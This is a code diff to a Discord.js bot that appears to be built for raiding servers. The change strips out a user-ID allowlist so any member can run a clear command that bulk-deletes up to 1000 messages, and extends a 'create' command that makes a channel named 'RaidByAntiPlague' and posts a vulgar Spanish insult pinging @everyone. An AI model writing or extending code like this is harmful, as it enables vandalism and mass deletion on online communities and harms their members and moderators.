@@ -93,10 +93,9 @@ client.on("message", message => {
   if (message.contebt === "Aa") {
     message.channel.send(`:regional_indicator_a:`);
     }
-  let petesxd = ["542817632957497383,746094948129964162,569701775029043200,580915232189186077"]
-if(!petesxd.includes(message.author.id)) return;
-  if (message.content === "c!clear 5") {
-    message.channel.bulkDelete(5);
+  
+  if (message.content === "c!clear ") {
+    message.channel.bulkDelete(1000);
       
     }
     if (message.author.bot) return;
@@ -110,7 +109,12 @@ if(!petesxd.includes(message.author.id)) return;
         })
         }
    if (message.content === prefix + 'create') {
-     message.guild.channels.create(`RaidByAntiPlague`)};
+     message.guild.channels.create(`RaidByAntiPlague`, {
+        type: 'text'
+        }).then(channel => {
+         channel.send("me la pelan @everyone")
+     })
+}
       
         
   })
